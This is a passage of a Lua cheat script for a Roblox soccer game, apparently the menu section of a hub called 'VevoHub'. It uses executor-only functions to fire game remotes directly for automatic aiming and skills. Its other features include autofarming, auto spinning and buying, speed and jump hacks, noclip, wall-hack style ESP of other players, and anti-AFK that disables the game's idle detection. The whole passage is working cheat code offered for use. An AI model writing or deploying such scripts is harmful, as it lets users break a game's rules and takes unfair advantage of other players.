					[1] = 'PunchBall',
					[2] = MyChar:FindFirstChild('Ball'),
					[3] = 1.25,
					[4] = Vector3.new(0.17995981872081757, -0.3644046187400818, -0.9136869311332703),
					[5] = Vector3.new(0.19315169751644135, 0.01585335098206997, -0.9810408353805542)
				}
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
			elseif game:GetService('Workspace').GameField.BlueLockmans.Spot1.Position == Vector3.new(253.4203643798828, 3.814638137817383, -713.7109985351562) then
				local args = {
					[1] = 'PunchBall',
					[2] = MyChar:FindFirstChild('Ball'),
					[3] = 1.25,
					[4] = Vector3.new(-0.9260265231132507, -0.3074670732021332, -0.21894952654838562),
					[5] = Vector3.new(-0.9730885624885559, 0.016010480001568794, -0.2298746258020401)
				}
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
			end
		until PlaceId ~= 13864400206
	end
end

--Auto functions
function AutoChoosePosition()
	if getgenv().IsAutoPosition then
		repeat
			ChoosePosition()
			task.wait()
		until not getgenv().IsAutoPosition
	end
end
function AutoFarm()
	if getgenv().IsAutoFarm then
		repeat
			PlayMatch()
			task.wait()
		until not getgenv().IsAutoFarm
	end
end
function AutoLeagueFarm()
	if getgenv().IsLeagueFarm then
		repeat
			PlayLeagueMatch()
			task.wait()
		until not getgenv().IsLeagueFarm
	end
end
function AutoSpin()
	if getgenv().IsAutoSpin then
		WSpin = false
		repeat
			Spin()
			task.wait()
		until not getgenv().IsAutoSpin
	end
end
function AutoBuy()
	if getgenv().IsAutoBuy then
		repeat
			Buy()
			task.wait()
		until not getgenv().IsAutoBuy
	end
end
function AutoDelete()
	if getgenv().IsAutoDelete then
		repeat
			Delete()
			task.wait()
		until not getgenv().IsAutoDelete
	end
end

Sections.Punch:AddLabel('Enable AutoAim'):AddKeyPicker('AutoAimKeyBind', {
    Default = 'Space',
    Mode = 'Toggle',
	Text = 'Auto Aim',
    NoUI = false,
    Callback = function(Value)
		getgenv().IsAutoAim = Value
    end
})
Sections.Punch:AddLabel('Enable AutoSkill'):AddKeyPicker('AutoSkillKeyBind', {
    Default = 'MB1',
    Mode = 'Toggle',
    NoUI = true,
    Callback = function(Value)
		if MyChar:FindFirstChild('Ball') and HoldingSkill() then
			if HoldingSkill() == 'Creative Trap' then
				local args = {
					[1] = "BackHeelPass",
					[2] = MyChar:WaitForChild('Ball'),
					[3] = 0.5,
					[4] = Vector3.zero,
					[5] = -(MyHRP.CFrame.LookVector)
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PunchRemote"):FireServer(unpack(args))
				CreativeTrap()
			elseif HoldingSkill() == 'Black Hole Trap' then
				local args = {
					[1] = 'LobPass',
					[2] = MyChar:WaitForChild('Ball'),
					[3] = MyHRP.Position + (MyHRP.CFrame.LookVector * 5)}		
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('PunchRemote'):FireServer(unpack(args))
				BlackHole()
			end
		end
    end
})

Sections.Defense:AddLabel('Enable ShootingMode'):AddKeyPicker('ShootingModeKeyBind', {
    Default = 'Q',
    Mode = 'Toggle',
	Text = 'ShootingMode',
    NoUI = false,
    Callback = function(Value)
		getgenv().IsShootingMode = Value
    end
})
Sections.Punch:AddLabel('PowerfulShot'):AddKeyPicker('PowerfulShotKeyBind', {
    Default = 'E',
    Mode = 'Toggle',
    NoUI = true,
    Callback = function(Value)
		PowerfulShot()
    end
})
Sections.Punch:AddLabel('Bicycle Kick'):AddKeyPicker('BicycleKeyBind', {
    Default = 'R',
    Mode = 'Toggle',
    NoUI = true,
    Callback = function(Value)
		BicycleKick()
    end
})
Sections.Punch:AddToggle('CanonKaiserToggle', {
    Text = 'Canon Kaiser',
    Default = true,
    Tooltip = 'Enables Canon Kaiser',
    Callback = function(Value)
		getgenv().CanonKaiser = Value
	end
})

if PlaceId ~= 12467817668 then
	Sections.Speed:AddSlider('SpeedBoostSlider', {
		Text = 'SpeedBoost',
		Default = (30-(17+MyPlayer:GetAttribute('RunSpeedBuff'))),
		Min = 0,
		Max = 5,
		Rounding = 1,
		Compact = false,
		Callback = function(Boost)
			getgenv().SpeedBoost = Boost
		end
	})
end
Sections.Speed:AddToggle('SpeedDemonToggle', {
    Text = 'SpeedDemon',
    Default = true,
    Tooltip = 'Enables speed boost',
    Callback = function(Value)
		getgenv().IsSpeedDemon = Value
	end
})
Sections.Defense:AddLabel('Enable AutoDefense'):AddKeyPicker('AutoDefenseKeyBind', {
    Default = 'MB2',
    Mode = 'Hold',
    NoUI = true,
    Callback = function(Value)
    end
})
task.spawn(function()
    while task.wait() do
		pcall(function()
			if Options.AutoDefenseKeyBind and Options.AutoDefenseKeyBind:GetState() then
				getgenv().IsAutoDefense = true
			else
				getgenv().IsAutoDefense = false
			end
		end)
    end
end)
Sections.Defense:AddLabel('Enable AutoTrap'):AddKeyPicker('AutoTrapKeyBind', {
    Default = 'F',
    Mode = 'Toggle',
	Text = 'AutoTrap',
    NoUI = false,
    Callback = function(Value)
		getgenv().IsAutoTrapping = Value
    end
})
Sections.Defense:AddLabel('Enable Gambling'):AddKeyPicker('GamblingKeyBind', {
    Default = 'Z',
    Mode = 'Toggle',
	Text = 'Gambling',
    NoUI = false,
    Callback = function(Value)
		getgenv().IsGamble = Value
    end
})
Sections.Defense:AddToggle('DisplayHitboxToggle', {
    Text = 'DisplayHitbox',
    Default = false,
    Tooltip = 'Displays Hitbox',
    Callback = function(Value)
		getgenv().IsHitbox = Value
	end
})
Sections.Positioning:AddDropdown('TeamDropdown', {
    Values = {'1','2'},
    Default = 1,
    Multi = false,
    Text = 'Team',
    Tooltip = 'Choose team',
    Callback = function(Value)
		getgenv().Team = tonumber(Value)
    end
})
Sections.Positioning:AddDropdown('PositionDropdown', {
    Values = {'Forward','LeftWinger','RightWinger','LeftDef','RightDef'},
    Default = 1,
    Multi = false,
    Text = 'Position',
    Tooltip = 'Choose position',
    Callback = function(Value)
		getgenv().Position = Value
    end
})
Sections.Positioning:AddToggle('AutoPositionToggle', {
    Text = 'AutoPosition',
    Default = false,
    Tooltip = 'Automatically chooses wanted position',
    Callback = function(Value)
		getgenv().IsAutoPosition = Value
		AutoChoosePosition()
	end
})

Sections.AutoFarm:AddToggle('AutoFarmToggle', {
    Text = 'AutoFarm',
    Default = false,
    Tooltip = 'Enables AutoFarm',
    Callback = function(Value)
		getgenv().IsAutoFarm = Value
		AutoFarm()
	end
})
Sections.AutoFarm:AddToggle('LeagueFarmToggle', {
    Text = 'LeagueFarm',
    Default = false,
    Tooltip = 'Enables LeagueFarm',
    Callback = function(Value)
		getgenv().IsLeagueFarm = Value
		AutoLeagueFarm()
	end
})
Sections.AutoFarm:AddToggle('AutoDailyChallengeToggle', {
    Text = 'Auto Daily Challenge',
    Default = false,
    Tooltip = 'Enables Auto Daily Challenge',
    Callback = function(Value)
		DailyChallenge()
	end
})

Sections.Misc:AddDropdown('SpinDropdown', {
    Values = {'Weapon','Prodigy'},
    Default = 1,
    Multi = false,
    Text = 'Spin',
    Tooltip = 'Choose what to spin',
    Callback = function(Value)
		getgenv().SpinType = Value
    end
})
Sections.Misc:AddDropdown('SlotDropdown', {
    Values = {'1','2','3'},
    Default = 1,
    Multi = false,
    Text = 'Slot',
    Tooltip = 'Choose slot to spin',
    Callback = function(Value)
		getgenv().Slot = Value
    end
})
Sections.Misc:AddDropdown('WeaponsDropdown', {
    Values = WeaponList,
    Default = 1,
    Multi = true,
    Text = 'Weapons',
    Tooltip = 'Choose wanted weapons',
    Callback = function(Value)
    end
})
Sections.Misc:AddDropdown('ProdigiesDropdown', {
    Values = ProdigyList,
    Default = 1,
    Multi = true,
    Text = 'Prodigies',
    Tooltip = 'Choose wanted prodigies',
    Callback = function(Value)
    end
})
Sections.Misc:AddToggle('AutoSpinToggle', {
    Text = 'AutoSpin',
    Default = false,
    Tooltip = 'Enables AutoSpin',
    Callback = function(Value)
		getgenv().IsAutoSpin = Value
		AutoSpin()
	end
})
Sections.Misc:AddDropdown('CosmeticDropdown', {
    Values = {'Emotes', 'Accessories'},
    Default = 1,
    Multi = false,
    Text = 'Cosmetic',
    Tooltip = 'Choose cosmetic',
    Callback = function(Value)
		getgenv().Cosmetics = Value
    end
})
Sections.Misc:AddToggle('AutoBuyToggle', {
    Text = 'AutoBuy',
    Default = false,
    Tooltip = 'Enables AutoBuy',
    Callback = function(Value)
		getgenv().IsAutoBuy = Value
		AutoBuy()
	end
})
Sections.Misc:AddToggle('AutoDeleteToggle', {
    Text = 'AutoDelete',
    Default = false,
    Tooltip = 'Enables AutoDelete',
    Callback = function(Value)
		getgenv().IsAutoDelete = Value
		AutoDelete()
	end
})
if game:GetService('ReplicatedStorage').Modules:FindFirstChild('CameraShaker') and not gethwid then
	require(game:GetService('ReplicatedStorage').Modules.CameraShaker).Update = function() return CFrame.new(0,0,0) end
	Sections.Misc:AddToggle('FixCameraToggle', {
		Text = 'FixCamera',
		Default = true,
		Tooltip = 'Fixes camera',
		Callback = function(Value)
			if Value then
				require(game:GetService('ReplicatedStorage').Modules.CameraShaker).Update = function() return CFrame.new(0,0,0) end
			else
				require(game:GetService('ReplicatedStorage').Modules.CameraShaker).Update = OldCameraShakeFunc
			end
		end
	})
end
Sections.Misc:AddToggle('Fov+Toggle', {
    Text = 'Fov+',
    Default = true,
    Tooltip = 'Increases fov',
    Callback = function(Value)
		getgenv().IsFov = Value
	end
})
getgenv().FovDistance = 85
Sections.Misc:AddSlider('FovSlider', {
    Text = 'Fov',
    Default = getgenv().FovDistance,
    Min = 85,
    Max = 150,
    Rounding = 0,
    Compact = false,
    Callback = function(Value)
		getgenv().FovDistance = Value
    end
})
game:GetService('Workspace').Camera:GetPropertyChangedSignal('FieldOfView'):Connect(function()
	if getgenv().IsFov then
		game:GetService('Workspace').Camera.FieldOfView = getgenv().FovDistance
	end
end)
Sections.Misc:AddToggle('AntiAFKToggle', {
    Text = 'AntiAFK',
    Default = false,
    Tooltip = 'Enables AntiAFK',
    Callback = function(Value)
		for i,v in pairs(getconnections(MyPlayer.Idled)) do
			v:Disable()
			v:Disconnect()
		end
	end
})

Sections.Player:AddSlider('WalkSpeedSlider', {
    Text = 'WalkSpeed',
    Default = 16,
    Min = 0,
    Max = 500,
    Rounding = 0,
    Compact = false,
    Callback = function(WS)
		getgenv().CurrentSpeed = WS
    end
})
Sections.Player:AddToggle('WalkSpeedToggle', {
    Text = 'Enable WalkSpeed',
    Default = false,
    Tooltip = 'Enables WalkSpeed',
    Callback = function(Value)
		getgenv().WalkSpeedToggle = Value
		if not getgenv().WalkSpeedToggle then
			MyChar.Humanoid.WalkSpeed = getgenv().FirstWS
		end
	end
})
Sections.Player:AddSlider('JumpPowerSlider', {
    Text = 'JumpPower',
    Default = 50,
    Min = 0,
    Max = 2000,
    Rounding = 0,
    Compact = false,
    Callback = function(JP)
		getgenv().CurrentJumpPower = JP
    end
})
Sections.Player:AddToggle('JumpPowerToggle', {
    Text = 'Enable JumpPower',
    Default = false,
    Tooltip = 'Enables JumpPower',
    Callback = function(Value)
		getgenv().JumpPowerToggle = Value
		if not getgenv().JumpPowerToggle then
			MyChar.Humanoid.JumpPower = getgenv().FirstJP
			MyChar.Humanoid.JumpHeight = getgenv().FirstJP
		end
	end
})
Sections.Player:AddToggle('NoClipToggle', {
    Text = 'NoClip',
    Default = false,
    Tooltip = 'Enables NoClip',
    Callback = function(Value)
		getgenv().NCToggle = Value
		if getgenv().NCToggle then
			Clip = false
			getgenv().Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
		else
			Clip = true
			getgenv().Noclipping:Disconnect()
		end
	end
})
local RejoinButton = Sections.Player:AddButton({
	Text = 'Rejoin',
	Func = function()
		if #game.Players:GetPlayers() <= 1 then
			MyPlayer:Kick('\nRejoining...')
			wait()
			game:GetService('TeleportService'):Teleport(game.PlaceId, MyPlayer)
		else
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, MyPlayer)
		end
	end,
	DoubleClick = false,
    Tooltip = 'Rejoins the same server'
})
local SHOPButton = Sections.Player:AddButton({
	Text = 'Server Hop',
	Func = function()
		if httprequest then
			local servers = {}
			local req = httprequest({Url = string.format('https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100', game.PlaceId)})
			local body = game:GetService('HttpService'):JSONDecode(req.Body)
			if body and body.data then
				for i, v in next, body.data do
					if type(v) == 'table' and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
						table.insert(servers, 1, v.id)
					end 
				end
			end
			if #servers > 0 then
				game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], MyPlayer)
			end
		end
	end,
	DoubleClick = false,
    Tooltip = 'Hops to another server'
})
local JoinSSButton = Sections.Player:AddButton({
	Text = 'Join Smallest Server',
	Func = function()
		local Server, Next; repeat
			local Servers = ListServers(Next)
			Server = Servers.data[1]
			Next = Servers.nextPageCursor
		until Server
		TeleportService:TeleportToPlaceInstance(_place,Server.id,MyPlayer)
	end,
	DoubleClick = false,
    Tooltip = 'Join the smallest server'
})

Sections.ESP:AddToggle('ESPToggle', {
    Text = 'ESP',
    Default = false,
    Tooltip = 'Enables ESP',
    Callback = function(Value)
		getgenv().PlrESPChecker = Value
	end
})
Sections.ESP:AddToggle('ShowNamesToggle', {
    Text = 'Show Names',
    Default = false,
    Tooltip = 'Shows names',
    Callback = function(Value)
		EspSettings.NamesEnabled = Value
	end
})
Sections.ESP:AddToggle('ShowHealthToggle', {
    Text = 'Show Health',
    Default = false,
    Tooltip = 'Shows health',
    Callback = function(Value)
		EspSettings.HealthEnabled = Value
	end
})
Sections.ESP:AddToggle('ShowDistanceToggle', {
    Text = 'Show Distance',
    Default = false,
    Tooltip = 'Shows distance',
    Callback = function(Value)
		EspSettings.DistanceEnabled = Value
	end
})
Sections.ESP:AddToggle('ShowBoxToggle', {
    Text = 'Show Box',
    Default = false,
    Tooltip = 'Shows box',
    Callback = function(Value)
		EspSettings.BoxEsp = Value
		SetProperties({ Box = { Visible = Value } })
	end
})
Sections.ESP:AddSlider('RenderDistanceSlider', {
    Text = 'Render Distance',
    Default = math.clamp(EspSettings.RenderDistance, 0, 50000),
    Min = 0,
    Max = 50000,
    Rounding = 0,
    Compact = false,
    Callback = function(Value)
		EspSettings.RenderDistance = Value
    end
})
Sections.ESP:AddSlider('ESPSizeSlider', {
    Text = 'ESP Size',
    Default = EspSettings.Size,
    Min = 0,
    Max = 30,
    Rounding = 0,
    Compact = false,
    Callback = function(Value)
		EspSettings.Size = Value
		SetProperties({ Text = { Size = Value } })
    end
})
Sections.ESP:AddLabel('ESP Color'):AddColorPicker('ESPColorPicker', {
    Default = EspSettings.Color,
    Title = 'ESP Color',
    Transparency = 0,
    Callback = function(Value)
		EspSettings.TeamColors = false
		EspSettings.Color = Value
		SetProperties({ Box = { Color = Value }, Text = { Color = Value }})
    end
})
Sections.ESP:AddToggle('ShowTeamColorsToggle', {
    Text = 'Show Team Colors',
    Default = false,
    Tooltip = 'Shows team colors',
    Callback = function(Value)
		EspSettings.TeamColors = Value
		if (not Value) then
			SetProperties({ Box = { Color = EspSettings.Color }; Text = { Color = EspSettings.Color }  })
		end
	end
})
Sections.ESP:AddDropdown('TeamsDropdown', {
    Values = {'Allies', 'Enemies', 'All'},
    Default = 3,
    Multi = false,
    Text = 'Teams',
    Tooltip = 'Shows teams',
    Callback = function(Value)
		table.clear(EspSettings.BlacklistedTeams);
		if (Value == 'Enemies') then
			table.insert(EspSettings.BlacklistedTeams, MyPlayer.Team);
		end
		if (Value == 'Allies') then
			local AllTeams = Teams:GetTeams();
			table.remove(AllTeams, table.find(AllTeams, MyPlayer.Team));
			EspSettings.BlacklistedTeams = AllTeams
		end
    end
})

Sections.Credits:AddLabel('Made by g0atku')
Sections.Credits:AddLabel('UI: Linoria')

-- UI Settings
Library.KeybindFrame.Visible = true;
Library:OnUnload(function()
    Library.Unloaded = true
end)
Sections.Menu:AddButton('Unload', function() Library:Unload() end)
Sections.Menu:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
Library.ToggleKeybind = Options.MenuKeybind
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
ThemeManager:SetFolder('VevoHub')
SaveManager:SetFolder('VevoHub/SO')
SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])
SaveManager:LoadAutoloadConfig()